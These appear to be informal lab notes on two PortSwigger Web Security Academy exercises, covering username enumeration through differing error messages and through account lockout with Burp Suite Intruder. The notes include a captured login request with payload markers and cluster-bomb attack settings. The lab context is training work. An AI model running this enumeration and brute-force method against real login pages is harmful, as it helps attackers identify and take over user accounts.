## Username enumeration via subtly different responses

1.First try to loging show Invalid username or password 

2. Loging page to worng username and password and burp request and sand intruder and add username 
3. set payloads
4. intruder sub-tab Option and scroll GREP-EXTRACT click add button and scroll and select Invalid username or password. and ok
5. and run the attack


 ## Username enumeration via account lock
 
  1. First try to loging show Invalid username or password
  2. Loging page to worng username and password and burp request and sand intruder and add username password add $$ 
  
  ## EX 
  
    POST /login HTTP/1.1
    Host: ac9b1f711ed8b1e1c0220cdd005b006a.web-security-academy.net
    Cookie: session=gyv8YLrvVqRcgxsc6JaG8vIgnRezoHew
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 27
    Origin: https://ac9b1f711ed8b1e1c0220cdd005b006a.web-security-academy.net
    Referer: https://ac9b1f711ed8b1e1c0220cdd005b006a.web-security-academy.net/login  
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    username=§asif§&password=khan§§
    
 3. select Attack Type=Cluster bomb
 4. set paylods number 1 simple list and past paylods number 2 null paylods and paylods option select type 4
 5. intruder sub-tab Option and scroll GREP-EXTRACT click add button and scroll and select Invalid username or password. and ok
 6. start the attack 
    
    
    
    
    
    
    
    
    
    
